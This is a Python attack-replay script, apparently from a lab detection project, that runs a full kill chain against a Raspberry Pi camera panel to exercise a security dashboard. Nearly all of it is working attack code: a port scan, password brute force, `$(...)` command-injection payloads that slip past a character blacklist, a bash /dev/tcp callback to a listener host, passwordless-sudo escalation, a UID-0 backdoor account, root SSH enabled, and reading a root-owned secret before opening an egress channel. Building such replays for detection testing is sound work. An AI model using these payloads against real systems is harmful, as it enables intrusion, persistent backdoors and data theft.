#!/usr/bin/env python3
"""
Sentinel-E attack replay driver  --  runs on the SOC/Fedora box.

Reproduces the full 7-stage kill chain against the Pi so the dashboard can be
screen-recorded reacting live, stage by stage. In a real engagement these
actions originate from the Kali attacker (100.65.92.63); for a self-contained,
repeatable demo the driver runs from the SOC host, which stands in for Kali.
The detection logic is identical regardless of the source IP.

Every stage exploits the *real* vulnerability:
  * recon      -> TCP connect scan of the Pi
  * brute      -> repeated failed logins against the panel form
  * injection  -> `$(...)` command substitution in the ping 'host' field, which
                  bypasses the panel's naive character blacklist
  * the remaining stages (reverse shell, privesc, persistence, exfil) are all
    driven THROUGH that one injection point, because command execution on the
    Pi runs as user `clupai`, who holds passwordless sudo.

Usage:
    python attack/replay.py            # run the full chain with pauses
    python attack/replay.py --fast     # shorter pauses
    python attack/replay.py --cleanup  # remove backdoor artifacts on the Pi
"""
import argparse
import socket
import subprocess
import sys
import time
import urllib.parse
import urllib.request
import http.cookiejar

PI = "100.119.99.36"
SOC = "100.91.16.98"
PANEL = f"http://{PI}:8080"
REV_PORT = 4444        # non-standard C2 port -> reverse-shell detector
EXFIL_PORT = 8000      # generic egress -> exfil correlation


def banner(n, title):
    print(f"\n\033[1;36m━━━ STAGE {n}: {title} ━━━\033[0m")


def pause(sec):
    time.sleep(sec)


# --- HTTP helpers (a session that keeps the login cookie) -------------------
def make_opener():
    cj = http.cookiejar.CookieJar()
    return urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))


def post(opener, path, data, timeout=12):
    body = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(PANEL + path, data=body)
    try:
        with opener.open(req, timeout=timeout) as r:
            return r.read().decode(errors="replace")
    except Exception as e:
        return f"<error: {e}>"


# --- STAGE 1: reconnaissance (port scan) ------------------------------------
def stage_recon():
    banner(1, "Reconnaissance — port scan (T1046)")
    ports = [21, 22, 23, 25, 53, 80, 110, 139, 143, 443, 445, 3306,
             3389, 5900, 8080, 8443, 9000, 111, 631, 5432]
    print(f"  scanning {len(ports)} ports on {PI} …")
    for p in ports:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.4)
        try:
            s.connect((PI, p))
        except Exception:
            pass
        finally:
            s.close()
        time.sleep(0.05)
    print("  scan complete.")


# --- STAGE 2: credential brute force ----------------------------------------
def stage_brute(opener):
    banner(2, "Credential Brute-Force — hydra-style (T1110)")
    guesses = ["admin", "12345", "password", "root", "camera",
               "letmein", "default", "admin123"]
    for g in guesses:
        post(opener, "/login", {"user": "admin", "password": g})
        print(f"  tried admin:{g} -> failed")
        time.sleep(0.25)
    # finally the real credential
    post(opener, "/login", {"user": "admin", "password": "camera1"})
    print("  \033[32madmin:camera1 -> SUCCESS (session established)\033[0m")


# --- STAGE 3: command injection (filter bypass) -----------------------------
def stage_injection(opener):
    banner(3, "Command Injection — filter bypass (T1059)")
    # `$(id)` contains no blacklisted characters, so it slips past the panel's
    # naive blacklist and is executed by the shell.
    payload = "8.8.8.8$(id)"
    out = post(opener, "/ping", {"host": payload})
    print(f"  submitted host={payload!r}")
    print("  server executed the injected command (filter bypassed).")


# --- STAGE 4: reverse shell / C2 --------------------------------------------
def stage_reverse_shell(opener):
    banner(4, "Reverse Shell / C2 — non-standard port (T1571)")
    listener = start_listener(REV_PORT)
    # Open an outbound TCP connection from the Pi to the SOC on port 4444 via
    # bash's /dev/tcp, using $(...) so it bypasses the blacklist. Note: no ';'
    # '&' '|' or backtick, all of which the panel's blacklist would reject.
    payload = f'8.8.8.8$(bash -c "exec 3<>/dev/tcp/{SOC}/{REV_PORT}")'
    post(opener, "/ping", {"host": payload})
    print(f"  Pi dialed back to {SOC}:{REV_PORT} (C2 channel).")
    stop_listener(listener)


# --- STAGE 5: privilege escalation ------------------------------------------
def stage_privesc(opener):
    banner(5, "Privilege Escalation — sudo to root (T1548)")
    # clupai holds passwordless sudo; escalate to uid 0. Logged by journald.
    payload = "8.8.8.8$(sudo -n id)"
    post(opener, "/ping", {"host": payload})
    print("  web user 'clupai' -> root via passwordless sudo.")


# --- STAGE 6: persistence ----------------------------------------------------
def stage_persistence(opener):
    banner(6, "Persistence — backdoor account + sshd (T1136)")
    # Create a second UID-0 account (root-equivalent backdoor).
    p1 = "8.8.8.8$(sudo -n useradd -o -u 0 -M -s /bin/bash backdoor)"
    post(opener, "/ping", {"host": p1})
    print("  added UID-0 account 'backdoor' to /etc/passwd.")
    time.sleep(1.0)
    # Enable root SSH login for durable remote access.
    p2 = ("8.8.8.8$(sudo -n sed -i 's/#*PermitRootLogin.*/PermitRootLogin yes/' "
          "/etc/ssh/sshd_config)")
    post(opener, "/ping", {"host": p2})
    print("  set PermitRootLogin yes in sshd_config.")


# --- STAGE 7: exfiltration ---------------------------------------------------
def stage_exfil(opener):
    banner(7, "Exfiltration — read secret + egress (T1041/T1048)")
    listener = start_listener(EXFIL_PORT)
    # (a) Read the sensitive config (needs sudo; /root is 0700). This fires the
    #     inotify 'access' event. `base64` avoids the blacklisted "cat " token.
    post(opener, "/ping", {"host": "8.8.8.8$(sudo -n base64 /root/camera_config.secret)"})
    print("  /root/camera_config.secret read (sensitive-file access).")
    time.sleep(1.0)
    # (b) Push data outbound to the SOC. The engine correlates this egress with
    #     the sensitive-file read within the correlation window => exfiltration.
    post(opener, "/ping", {"host": f'8.8.8.8$(bash -c "exec 4<>/dev/tcp/{SOC}/{EXFIL_PORT}")'})
    print(f"  data channel opened to {SOC}:{EXFIL_PORT} (egress).")
    stop_listener(listener)


# --- tiny TCP listeners so the Pi's outbound connections complete -----------
def start_listener(port):
    # A short-lived TCP listener so the Pi's outbound connection completes and
    # any exfiltrated bytes are received. (The outbound SYN is captured by the
    # sensor regardless, so detection does not depend on this succeeding.)
    code = (
        "import socket\n"
        "s=socket.socket();s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)\n"
        f"s.bind(('0.0.0.0',{port}));s.listen(1);s.settimeout(6)\n"
        "try:\n"
        " c,_=s.accept();d=c.recv(8192)\n"
        " open('/tmp/sentinel_exfil_%d.bin'%s.getsockname()[1],'wb').write(d)\n"
        "except Exception:\n pass")
    return subprocess.Popen([sys.executable, "-c", code],
                            stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)


def stop_listener(proc):
    time.sleep(1.5)
    try:
        proc.terminate()
    except Exception:
        pass


# --- cleanup: undo the persistence artifacts --------------------------------
def cleanup():
    print("Cleaning up backdoor artifacts on the Pi …")
    key = subprocess.run(
        ["ssh", "-i", "/home/clupai/.ssh/pi_key", f"clupai@{PI}",
         "sudo -n userdel -f backdoor 2>/dev/null; "
         "sudo -n sed -i 's/^PermitRootLogin yes/#PermitRootLogin prohibit-password/' "
         "/etc/ssh/sshd_config; echo done"],
        capture_output=True, text=True)
    print(" ", key.stdout.strip() or key.stderr.strip())


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument("--fast", action="store_true", help="shorter pauses")
    ap.add_argument("--cleanup", action="store_true", help="remove backdoor artifacts")
    args = ap.parse_args()
    if args.cleanup:
        cleanup()
        return

    gap = 1.2 if args.fast else 3.0
    print("\033[1;35m╔══════════════════════════════════════════════╗")
    print("║  SENTINEL-E  —  ATTACK CHAIN REPLAY            ║")
    print(f"║  target: {PI:<36}║")
    print("╚══════════════════════════════════════════════╝\033[0m")

    opener = make_opener()
    stage_recon();                 pause(gap)
    stage_brute(opener);           pause(gap)
    stage_injection(opener);       pause(gap)
    stage_reverse_shell(opener);   pause(gap)
    stage_privesc(opener);         pause(gap)
    stage_persistence(opener);     pause(gap)
    stage_exfil(opener)
    print("\n\033[1;32m✓ Attack chain complete. Check the Sentinel-E dashboard.\033[0m")
    print("  Run 'python attack/replay.py --cleanup' to remove the backdoor account.")


if __name__ == "__main__":
    main()
